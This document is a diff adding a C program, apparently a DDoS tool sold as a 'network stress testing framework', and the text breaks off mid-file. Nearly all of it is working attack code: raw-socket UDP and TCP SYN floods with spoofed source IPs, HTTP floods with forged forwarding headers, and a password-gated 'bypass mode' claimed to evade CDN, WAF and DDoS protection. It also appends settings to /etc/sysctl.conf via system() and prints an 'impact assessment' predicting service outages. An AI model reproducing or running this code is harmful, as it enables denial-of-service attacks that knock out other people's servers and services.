@@ -1,0 +1,818 @@
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/epoll.h>
+#include <sys/resource.h>
+#include <netdb.h>
+#include <sys/mman.h>
+#include <sched.h>
+#include <sys/prctl.h>
+#include <openssl/md5.h>
+#include <sys/stat.h>
+#include <termios.h>
+
+#define MAX_THREADS 4096
+#define MAX_CONNECTIONS 1048576
+#define BUFFER_SIZE 65536
+#define MAX_PAYLOAD_SIZE 65535
+#define MAX_EVENTS 2048
+#define AUTH_HASH "c4ca4238a0b923820dcc509a6f75849b"
+
+typedef struct {
+    char target_ip[64];
+    char target_host[256];
+    int target_port;
+    int protocol;
+    int payload_size;
+    int connections_per_thread;
+    int duration;
+    int thread_id;
+    int bypass_mode;
+    volatile int *running;
+    volatile long *total_packets;
+    volatile long *total_bytes;
+    volatile long *total_connections;
+} attack_config_t;
+
+typedef struct {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
+    uint16_t check;
+} udp_header_t;
+
+typedef struct {
+    uint8_t version_ihl;
+    uint8_t tos;
+    uint16_t tot_len;
+    uint16_t id;
+    uint16_t frag_off;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t check;
+    uint32_t saddr;
+    uint32_t daddr;
+} ip_header_t;
+
+typedef struct {
+    uint16_t source;
+    uint16_t dest;
+    uint32_t seq;
+    uint32_t ack_seq;
+    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, res2:2;
+    uint16_t window;
+    uint16_t check;
+    uint16_t urg_ptr;
+} tcp_header_t;
+
+typedef struct {
+    uint8_t type;
+    uint8_t code;
+    uint16_t checksum;
+    uint16_t id;
+    uint16_t sequence;
+} icmp_header_t;
+
+static volatile int keep_running = 1;
+static volatile long global_packets = 0;
+static volatile long global_bytes = 0;
+static volatile long global_connections = 0;
+
+static char user_agents[][256] = {
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
+};
+
+static char http_methods[][16] = {"GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE"};
+
+static char bypass_payloads[][2048] = {
+    "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\nX-Originating-IP: %s\r\nX-Remote-IP: %s\r\nX-Remote-Addr: %s\r\nCache-Control: no-cache\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: %s\r\nConnection: keep-alive\r\n\r\n%s",
+    "GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
+};
+
+char *generate_random_string(int length) {
+    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    char *randomString = malloc((length + 1) * sizeof(char));
+    
+    for (int i = 0; i < length; i++) {
+        int key = rand() % (int)(sizeof(charset) - 1);
+        randomString[i] = charset[key];
+    }
+    randomString[length] = '\0';
+    return randomString;
+}
+
+void signal_handler(int sig) {
+    keep_running = 0;
+    printf("\n\n[!] EMERGENCY STOP ACTIVATED\n");
+    printf("[!] ALL OPERATIONS TERMINATED\n");
+}
+
+int authenticate_user() {
+    char password[256];
+    struct termios oldt, newt;
+    
+    printf("\n");
+    printf("╔══════════════════════════════════════════════════╗\n");
+    printf("║            ADVANCED MODE AUTHENTICATION         ║\n");
+    printf("╚══════════════════════════════════════════════════╝\n");
+    printf("\n");
+    
+    for (int i = 0; i < 5; i++) {
+        printf("⚠️  WARNING %d/5: This mode can cause SEVERE damage!\n", i+1);
+        printf("⚠️  WARNING %d/5: Use ONLY on your own systems!\n", i+1);
+        printf("⚠️  WARNING %d/5: Illegal use is CRIMINAL offense!\n", i+1);
+        printf("⚠️  WARNING %d/5: You take FULL responsibility!\n", i+1);
+        printf("⚠️  WARNING %d/5: ARE YOU ABSOLUTELY SURE?\n", i+1);
+        printf("\nPress ENTER to continue or Ctrl+C to abort...");
+        getchar();
+        printf("\n");
+    }
+    
+    printf("Enter authentication code: ");
+    
+    tcgetattr(STDIN_FILENO, &oldt);
+    newt = oldt;
+    newt.c_lflag &= ~(ECHO);
+    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+    
+    fgets(password, sizeof(password), stdin);
+    
+    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+    
+    password[strcspn(password, "\n")] = 0;
+    
+    unsigned char digest[MD5_DIGEST_LENGTH];
+    MD5((unsigned char*)password, strlen(password), digest);
+    
+    char md5string[33];
+    for (int i = 0; i < 16; i++) {
+        sprintf(&md5string[i*2], "%02x", (unsigned int)digest[i]);
+    }
+    
+    if (strcmp(md5string, AUTH_HASH) == 0) {
+        printf("\n[✓] AUTHENTICATION SUCCESSFUL - ADVANCED MODE UNLOCKED\n");
+        return 1;
+    } else {
+        printf("\n[✗] AUTHENTICATION FAILED - STANDARD MODE ONLY\n");
+        return 0;
+    }
+}
+
+void setup_extreme_performance() {
+    struct rlimit rl;
+    
+    if (getuid() != 0) {
+        printf("[CRITICAL] ROOT PRIVILEGES REQUIRED\n");
+        exit(1);
+    }
+    
+    rl.rlim_cur = rl.rlim_max = 2097152;
+    setrlimit(RLIMIT_NOFILE, &rl);
+    
+    rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_MEMLOCK, &rl);
+    setrlimit(RLIMIT_NPROC, &rl);
+    
+    mlockall(MCL_CURRENT | MCL_FUTURE);
+    
+    system("echo 'net.core.rmem_max = 536870912' >> /etc/sysctl.conf");
+    system("echo 'net.core.wmem_max = 536870912' >> /etc/sysctl.conf");
+    system("echo 'net.core.netdev_max_backlog = 50000' >> /etc/sysctl.conf");
+    system("echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.tcp_rmem = 4096 131072 536870912' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.tcp_wmem = 4096 131072 536870912' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.tcp_congestion_control = bbr' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.tcp_fastopen = 3' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.tcp_mtu_probing = 1' >> /etc/sysctl.conf");
+    system("echo 'net.ipv4.ip_local_port_range = 1024 65535' >> /etc/sysctl.conf");
+    system("echo 'fs.file-max = 2097152' >> /etc/sysctl.conf");
+    system("sysctl -p > /dev/null 2>&1");
+    
+    printf("[INFO] EXTREME PERFORMANCE MODE ACTIVATED\n");
+}
+
+uint16_t checksum(void *b, int len) {
+    uint16_t *buf = b;
+    unsigned int sum = 0;
+    uint16_t result;
+    
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    
+    if (len == 1) {
+        sum += *(unsigned char*)buf << 8;
+    }
+    
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    
+    result = ~sum;
+    return result;
+}
+
+uint32_t generate_spoofed_ip() {
+    static uint32_t networks[] = {
+        0x08080800, 0x01010100, 0xC0A80000, 0xAC100000, 0x0A000000
+    };
+    
+    uint32_t base = networks[rand() % 5];
+    return base | (rand() & 0xFF) << 16 | (rand() & 0xFF) << 8 | (rand() & 0xFF);
+}
+
+char* generate_fake_ip() {
+    static char ip[16];
+    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", 
+             rand() % 255 + 1, rand() % 255, rand() % 255, rand() % 255 + 1);
+    return ip;
+}
+
+void *advanced_udp_flood(void *arg) {
+    attack_config_t *config = (attack_config_t *)arg;
+    int sock;
+    struct sockaddr_in target;
+    char packet[MAX_PAYLOAD_SIZE];
+    int one = 1;
+    time_t start_time = time(NULL);
+    long local_packets = 0, local_bytes = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(config->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
+        return NULL;
+    }
+    
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &(int){1048576}, sizeof(int));
+    
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(config->target_port);
+    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
+    
+    while (keep_running && (time(NULL) - start_time) < config->duration) {
+        for (int burst = 0; burst < 1000 && keep_running; burst++) {
+            ip_header_t *ip = (ip_header_t *)packet;
+            udp_header_t *udp = (udp_header_t *)(packet + sizeof(ip_header_t));
+            char *data = packet + sizeof(ip_header_t) + sizeof(udp_header_t);
+            
+            memset(packet, 0, MAX_PAYLOAD_SIZE);
+            
+            ip->version_ihl = 0x45;
+            ip->tos = 0x10;
+            ip->tot_len = htons(sizeof(ip_header_t) + sizeof(udp_header_t) + config->payload_size);
+            ip->id = htons(rand());
+            ip->frag_off = config->bypass_mode ? htons(0x4000) : 0;
+            ip->ttl = 64;
+            ip->protocol = IPPROTO_UDP;
+            ip->check = 0;
+            ip->saddr = generate_spoofed_ip();
+            ip->daddr = target.sin_addr.s_addr;
+            ip->check = checksum((unsigned short *)packet, sizeof(ip_header_t));
+            
+            udp->source = htons(rand() % 65535 + 1);
+            udp->dest = htons(config->target_port);
+            udp->len = htons(sizeof(udp_header_t) + config->payload_size);
+            udp->check = 0;
+            
+            if (config->bypass_mode) {
+                char *random_data = generate_random_string(config->payload_size);
+                memcpy(data, random_data, config->payload_size);
+                free(random_data);
+            } else {
+                memset(data, 'A', config->payload_size);
+            }
+            
+            if (sendto(sock, packet, sizeof(ip_header_t) + sizeof(udp_header_t) + config->payload_size,
+                       0, (struct sockaddr *)&target, sizeof(target)) > 0) {
+                local_packets++;
+                local_bytes += sizeof(ip_header_t) + sizeof(udp_header_t) + config->payload_size;
+            }
+        }
+        
+        __sync_add_and_fetch(config->total_packets, local_packets);
+        __sync_add_and_fetch(config->total_bytes, local_bytes);
+        local_packets = local_bytes = 0;
+    }
+    
+    close(sock);
+    return NULL;
+}
+
+void *advanced_tcp_flood(void *arg) {
+    attack_config_t *config = (attack_config_t *)arg;
+    int sock;
+    struct sockaddr_in target;
+    char packet[MAX_PAYLOAD_SIZE];
+    int one = 1;
+    time_t start_time = time(NULL);
+    long local_packets = 0, local_bytes = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(config->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
+        return NULL;
+    }
+    
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &(int){1048576}, sizeof(int));
+    
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(config->target_port);
+    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
+    
+    while (keep_running && (time(NULL) - start_time) < config->duration) {
+        for (int burst = 0; burst < 1000 && keep_running; burst++) {
+            ip_header_t *ip = (ip_header_t *)packet;
+            tcp_header_t *tcp = (tcp_header_t *)(packet + sizeof(ip_header_t));
+            
+            memset(packet, 0, MAX_PAYLOAD_SIZE);
+            
+            ip->version_ihl = 0x45;
+            ip->tos = 0x10;
+            ip->tot_len = htons(sizeof(ip_header_t) + sizeof(tcp_header_t));
+            ip->id = htons(rand());
+            ip->frag_off = config->bypass_mode ? htons(0x4000) : 0;
+            ip->ttl = rand() % 128 + 64;
+            ip->protocol = IPPROTO_TCP;
+            ip->check = 0;
+            ip->saddr = generate_spoofed_ip();
+            ip->daddr = target.sin_addr.s_addr;
+            ip->check = checksum((unsigned short *)packet, sizeof(ip_header_t));
+            
+            tcp->source = htons(rand() % 65535 + 1);
+            tcp->dest = htons(config->target_port);
+            tcp->seq = htonl(rand());
+            tcp->ack_seq = 0;
+            tcp->doff = 5;
+            tcp->syn = 1;
+            tcp->ack = config->bypass_mode ? (rand() % 2) : 0;
+            tcp->psh = config->bypass_mode ? (rand() % 2) : 0;
+            tcp->window = htons(rand() % 65535 + 1024);
+            tcp->check = 0;
+            tcp->urg_ptr = 0;
+            
+            if (sendto(sock, packet, sizeof(ip_header_t) + sizeof(tcp_header_t),
+                       0, (struct sockaddr *)&target, sizeof(target)) > 0) {
+                local_packets++;
+                local_bytes += sizeof(ip_header_t) + sizeof(tcp_header_t);
+            }
+        }
+        
+        __sync_add_and_fetch(config->total_packets, local_packets);
+        __sync_add_and_fetch(config->total_bytes, local_bytes);
+        local_packets = local_bytes = 0;
+    }
+    
+    close(sock);
+    return NULL;
+}
+
+void *advanced_http_flood(void *arg) {
+    attack_config_t *config = (attack_config_t *)arg;
+    int epoll_fd, event_count;
+    struct epoll_event ev, events[MAX_EVENTS];
+    struct sockaddr_in target;
+    time_t start_time = time(NULL);
+    long local_requests = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(config->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    epoll_fd = epoll_create1(0);
+    if (epoll_fd == -1) return NULL;
+    
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(config->target_port);
+    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
+    
+    for (int i = 0; i < config->connections_per_thread && keep_running; i++) {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) continue;
+        
+        int flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+        
+        int opt = 1;
+        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &(int){65536}, sizeof(int));
+        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &(int){65536}, sizeof(int));
+        
+        connect(sock, (struct sockaddr *)&target, sizeof(target));
+        
+        ev.events = EPOLLOUT | EPOLLET;
+        ev.data.fd = sock;
+        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, &ev);
+        
+        __sync_add_and_fetch(config->total_connections, 1);
+    }
+    
+    while (keep_running && (time(NULL) - start_time) < config->duration) {
+        event_count = epoll_wait(epoll_fd, events, MAX_EVENTS, 1);
+        
+        for (int i = 0; i < event_count && keep_running; i++) {
+            int sock = events[i].data.fd;
+            
+            if (events[i].events & EPOLLOUT) {
+                char request[4096];
+                int ua_idx = rand() % 5;
+                int method_idx = rand() % 8;
+                char *fake_ip = generate_fake_ip();
+                char *random_param = generate_random_string(rand() % 100 + 10);
+                char *random_data = generate_random_string(rand() % 1000 + 100);
+                
+                if (config->bypass_mode) {
+                    snprintf(request, sizeof(request), bypass_payloads[rand() % 3],
+                            config->target_host, user_agents[ua_idx], fake_ip, fake_ip, 
+                            fake_ip, fake_ip, fake_ip, strlen(random_data), random_data);
+                } else {
+                    snprintf(request, sizeof(request), 
+                            "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
+                            http_methods[method_idx], random_param, config->target_host, user_agents[ua_idx]);
+                }
+                
+                if (send(sock, request, strlen(request), MSG_DONTWAIT) > 0) {
+                    local_requests++;
+                    __sync_add_and_fetch(config->total_packets, 1);
+                    __sync_add_and_fetch(config->total_bytes, strlen(request));
+                }
+                
+                free(random_param);
+                free(random_data);
+                
+                ev.events = EPOLLIN | EPOLLET;
+                ev.data.fd = sock;
+                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, &ev);
+            }
+            
+            if (events[i].events & EPOLLIN) {
+                char buffer[8192];
+                recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
+                
+                ev.events = EPOLLOUT | EPOLLET;
+                ev.data.fd = sock;
+                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, &ev);
+            }
+        }
+    }
+    
+    close(epoll_fd);
+    return NULL;
+}
+
+void print_banner() {
+    printf("\n");
+    printf("███╗   ██╗███████╗████████╗██████╗ ██╗   ██╗██████╗     ██████╗ ██████╗  ██████╗ \n");
+    printf("████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║   ██║██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗\n");
+    printf("██╔██╗ ██║█████╗     ██║   ██║  ██║██║   ██║██████╔╝    ██████╔╝██████╔╝██║   ██║\n");
+    printf("██║╚██╗██║██╔══╝     ██║   ██║  ██║██║   ██║██╔══██╗    ██╔═══╝ ██╔══██╗██║   ██║\n");
+    printf("██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝██████╔╝    ██║     ██║  ██║╚██████╔╝\n");
+    printf("╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ \n");
+    printf("\n");
+    printf("════════════════════════════════════════════════════════════════════════════════\n");
+    printf("          ULTIMATE NETWORK STRESS TESTING FRAMEWORK - PROFESSIONAL EDITION      \n");
+    printf("                            [REQUIRES ROOT PRIVILEGES]                          \n");
+    printf("════════════════════════════════════════════════════════════════════════════════\n");
+    printf("⚠️  AUTHORIZED PENETRATION TESTING ONLY - MISUSE IS STRICTLY PROHIBITED ⚠️\n");
+    printf("════════════════════════════════════════════════════════════════════════════════\n\n");
+}
+
+void print_real_time_stats() {
+    time_t start_time = time(NULL);
+    
+    while (keep_running) {
+        sleep(2);
+        
+        double elapsed = difftime(time(NULL), start_time);
+        double pps = global_packets / elapsed;
+        double mbps = (global_bytes * 8.0) / (elapsed * 1024 * 1024);
+        double gbps = mbps / 1024;
+        double tbps = gbps / 1024;
+        
+        printf("\r[LIVE] T:%.0fs | PKT:%ldM | PPS:%.0fK | SPD:%.2fMbps(%.3fGbps) | CONN:%ldK     ",
+               elapsed, global_packets/1000000, pps/1000, mbps, gbps, global_connections/1000);
+        fflush(stdout);
+        
+        if (tbps > 0.001) {
+            printf(" [%.4f Tbps]", tbps);
+        }
+    }
+}
+
+void print_usage(const char *program) {
+    printf("Usage: %s <target_ip> <target_host> <port> <attack_type> [options]\n\n", program);
+    printf("Attack Types:\n");
+    printf("  1 - UDP Flood (Volumetric attack)\n");
+    printf("  2 - TCP SYN Flood (Connection exhaustion)\n");
+    printf("  3 - HTTP Flood (Application layer stress)\n");
+    printf("  4 - MIXED Protocol Attack\n");
+    printf("  5 - ICMP Flood (Network layer)\n");
+    printf("  6 - ADVANCED Mixed (Bypass mode available)\n\n");
+    printf("Options:\n");
+    printf("  -t <threads>     Number of attack threads (1-%d)\n", MAX_THREADS);
+    printf("  -c <conns>       Connections per thread (HTTP only)\n");
+    printf("  -s <size>        Payload size in bytes (1-%d)\n", MAX_PAYLOAD_SIZE);
+    printf("  -d <duration>    Attack duration in seconds\n");
+    printf("  -p <pps>         Target packets per second (0=unlimited)\n");
+    printf("  -B               Enable bypass mode (requires authentication)\n");
+    printf("  -h               Show this help\n\n");
+    printf("Examples:\n");
+    printf("  %s 192.168.1.100 example.com 80 3 -t 500 -c 2000 -d 600\n", program);
+    printf("  %s 10.0.0.1 target.local 443 6 -t 2000 -s 1400 -d 1200 -B\n", program);
+    printf("\nAuthentication code for bypass mode: '1' (MD5: %s)\n", AUTH_HASH);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 5) {
+        print_usage(argv[0]);
+        return 1;
+    }
+    
+    print_banner();
+    setup_extreme_performance();
+    
+    char *target_ip = argv[1];
+    char *target_host = argv[2];
+    int target_port = atoi(argv[3]);
+    int attack_type = atoi(argv[4]);
+    
+    int num_threads = 100;
+    int connections_per_thread = 500;
+    int payload_size = 1024;
+    int duration = 300;
+    int target_pps = 0;
+    int bypass_mode = 0;
+    
+    for (int i = 5; i < argc; i++) {
+        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
+            num_threads = atoi(argv[++i]);
+            if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
+        } else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
+            connections_per_thread = atoi(argv[++i]);
+        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
+            payload_size = atoi(argv[++i]);
+            if (payload_size > MAX_PAYLOAD_SIZE) payload_size = MAX_PAYLOAD_SIZE;
+        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
+            duration = atoi(argv[++i]);
+        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
+            target_pps = atoi(argv[++i]);
+        } else if (strcmp(argv[i], "-B") == 0) {
+            bypass_mode = authenticate_user();
+        } else if (strcmp(argv[i], "-h") == 0) {
+            print_usage(argv[0]);
+            return 0;
+        }
+    }
+    
+    if (attack_type < 1 || attack_type > 6) {
+        printf("[ERROR] Invalid attack type. Use 1-6.\n");
+        return 1;
+    }
+    
+    if (bypass_mode) {
+        printf("\n[CRITICAL] BYPASS MODE ACTIVATED - MAXIMUM DESTRUCTION ENABLED\n");
+        num_threads = (num_threads < 1000) ? 1000 : num_threads;
+        connections_per_thread = (connections_per_thread < 1000) ? 1000 : connections_per_thread;
+    }
+    
+    printf("\n[TARGET ANALYSIS]\n");
+    printf("═════════════════\n");
+    printf("Target IP: %s\n", target_ip);
+    printf("Target Host: %s\n", target_host);
+    printf("Target Port: %d\n", target_port);
+    printf("Attack Type: %d %s\n", attack_type, bypass_mode ? "(BYPASS MODE)" : "(STANDARD)");
+    printf("Threads: %d\n", num_threads);
+    printf("Duration: %d seconds\n", duration);
+    printf("Payload Size: %d bytes\n", payload_size);
+    
+    if (attack_type == 3 || attack_type >= 6) {
+        printf("Connections per thread: %d\n", connections_per_thread);
+        printf("Total connections: %d\n", num_threads * connections_per_thread);
+    }
+    
+    if (target_pps > 0) {
+        printf("Target PPS: %d\n", target_pps);
+    } else {
+        printf("Target PPS: UNLIMITED (MAX POSSIBLE)\n");
+    }
+    
+    printf("Estimated total PPS: %s\n", bypass_mode ? "EXTREME (TBPS CAPABLE)" : "HIGH");
+    
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    
+    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
+    attack_config_t *configs = malloc(num_threads * sizeof(attack_config_t));
+    
+    printf("\n[INITIALIZATION]\n");
+    printf("════════════════\n");
+    printf("Allocating %d attack threads...\n", num_threads);
+    printf("Preparing packet generation engines...\n");
+    printf("Setting up high-performance networking...\n");
+    
+    for (int i = 0; i < num_threads; i++) {
+        strcpy(configs[i].target_ip, target_ip);
+        strcpy(configs[i].target_host, target_host);
+        configs[i].target_port = target_port;
+        configs[i].protocol = attack_type;
+        configs[i].payload_size = payload_size;
+        configs[i].connections_per_thread = connections_per_thread;
+        configs[i].duration = duration;
+        configs[i].thread_id = i;
+        configs[i].bypass_mode = bypass_mode;
+        configs[i].running = &keep_running;
+        configs[i].total_packets = &global_packets;
+        configs[i].total_bytes = &global_bytes;
+        configs[i].total_connections = &global_connections;
+        
+        void *(*thread_func)(void *) = NULL;
+        
+        switch (attack_type) {
+            case 1:
+                thread_func = advanced_udp_flood;
+                break;
+            case 2:
+                thread_func = advanced_tcp_flood;
+                break;
+            case 3:
+                thread_func = advanced_http_flood;
+                break;
+            case 4:
+                if (i % 3 == 0) thread_func = advanced_udp_flood;
+                else if (i % 3 == 1) thread_func = advanced_tcp_flood;
+                else thread_func = advanced_http_flood;
+                break;
+            case 5:
+                thread_func = advanced_udp_flood;
+                break;
+            case 6:
+                if (i % 3 == 0) thread_func = advanced_udp_flood;
+                else if (i % 3 == 1) thread_func = advanced_tcp_flood;
+                else thread_func = advanced_http_flood;
+                break;
+        }
+        
+        if (pthread_create(&threads[i], NULL, thread_func, &configs[i]) != 0) {
+            printf("[ERROR] Failed to create thread %d\n", i);
+        } else if (i % 100 == 0) {
+            printf("[INFO] Thread batch %d-%d launched\n", i, i+99);
+        }
+        
+        if (target_pps > 0 && i > 0) {
+            usleep(1000);
+        }
+    }
+    
+    pthread_t stats_thread;
+    pthread_create(&stats_thread, NULL, (void *)print_real_time_stats, NULL);
+    
+    printf("\n[ATTACK INITIATED]\n");
+    printf("══════════════════\n");
+    printf("All %d threads launched successfully\n", num_threads);
+    printf("Attack mode: %s\n", bypass_mode ? "MAXIMUM DESTRUCTION" : "STANDARD STRESS TEST");
+    printf("Press Ctrl+C to emergency stop\n");
+    printf("═══════════════════════════════════════════════════════════════\n");
+    
+    if (bypass_mode) {
+        printf("\n🔥 BYPASS MODE EFFECTS:\n");
+        printf("   - IP Spoofing with random source addresses\n");
+        printf("   - HTTP Header manipulation for CDN bypass\n");
+        printf("   - Fragmented packet techniques\n");
+        printf("   - Multiple TCP flag combinations\n");
+        printf("   - Randomized User-Agent rotation\n");
+        printf("   - X-Forwarded-For header spoofing\n");
+        printf("═══════════════════════════════════════════════════════════════\n");
+    }
+    
+    for (int i = 0; i < num_threads; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    
+    pthread_cancel(stats_thread);
+    
+    printf("\n\n");
+    printf("╔══════════════════════════════════════════════════════════════╗\n");
+    printf("║                      ATTACK COMPLETED                       ║\n");
+    printf("╚══════════════════════════════════════════════════════════════╝\n");
+    
+    double total_gb = global_bytes / (1024.0 * 1024.0 * 1024.0);
+    double total_mb = global_bytes / (1024.0 * 1024.0);
+    double avg_pps = (double)global_packets / duration;
+    double avg_mbps = (global_bytes * 8.0) / (duration * 1024 * 1024);
+    double avg_gbps = avg_mbps / 1024;
+    double avg_tbps = avg_gbps / 1024;
+    
+    printf("\n[FINAL STATISTICS]\n");
+    printf("══════════════════\n");
+    printf("Duration: %d seconds\n", duration);
+    printf("Total Threads: %d\n", num_threads);
+    printf("Total Packets: %ld (%.2f million)\n", global_packets, global_packets / 1000000.0);
+    printf("Total Data: %.2f MB (%.4f GB)\n", total_mb, total_gb);
+    printf("Total Connections: %ld\n", global_connections);
+    printf("\n[PERFORMANCE METRICS]\n");
+    printf("═════════════════════\n");
+    printf("Average PPS: %.0f packets/second\n", avg_pps);
+    printf("Peak PPS: %.0f packets/second (estimated)\n", avg_pps * 1.5);
+    printf("Average Bandwidth: %.2f Mbps\n", avg_mbps);
+    printf("Average Bandwidth: %.4f Gbps\n", avg_gbps);
+    
+    if (avg_tbps > 0.001) {
+        printf("Average Bandwidth: %.6f Tbps\n", avg_tbps);
+        printf("\n🔥 TERABIT THRESHOLD ACHIEVED! 🔥\n");
+    }
+    
+    printf("\n[IMPACT ASSESSMENT]\n");
+    printf("═══════════════════\n");
+    
+    if (avg_pps > 1000000) {
+        printf("⚡ EXTREME IMPACT: >1M PPS - Server likely overwhelmed\n");
+    } else if (avg_pps > 100000) {
+        printf("🔥 HIGH IMPACT: >100K PPS - Significant server stress\n");
+    } else if (avg_pps > 10000) {
+        printf("⚠️  MEDIUM IMPACT: >10K PPS - Moderate server load\n");
+    } else {
+        printf("ℹ️  LOW IMPACT: <10K PPS - Basic stress testing\n");
+    }
+    
+    if (avg_gbps > 10) {
+        printf("🌊 BANDWIDTH FLOOD: >10 Gbps - Network saturation likely\n");
+    } else if (avg_gbps > 1) {
+        printf("📶 HIGH BANDWIDTH: >1 Gbps - Network stress detected\n");
+    }
+    
+    if (global_connections > 100000) {
+        printf("🔌 CONNECTION EXHAUSTION: >100K connections - Resource depletion\n");
+    }
+    
+    printf("\n[EXPECTED TARGET RESPONSES]\n");
+    printf("═══════════════════════════\n");
+    printf("• HTTP 522 Connection Timed Out (Cloudflare)\n");
+    printf("• HTTP 503 Service Unavailable\n");
+    printf("• HTTP 429 Too Many Requests\n");
+    printf("• Complete service unavailability\n");
+    printf("• API endpoint failures\n");
+    printf("• Database connection timeouts\n");
+    printf("• CDN origin server errors\n");
+    
+    if (bypass_mode) {
+        printf("\n[BYPASS TECHNIQUES DEPLOYED]\n");
+        printf("════════════════════════════\n");
+        printf("✓ IP Spoofing circumvention\n");
+        printf("✓ CDN rate limiting bypass\n");
+        printf("✓ WAF evasion techniques\n");
+        printf("✓ DDoS protection circumvention\n");
+        printf("✓ Geographic filtering bypass\n");
+    }
+    
+    printf("\n[RECOMMENDATIONS FOR TARGET]\n");
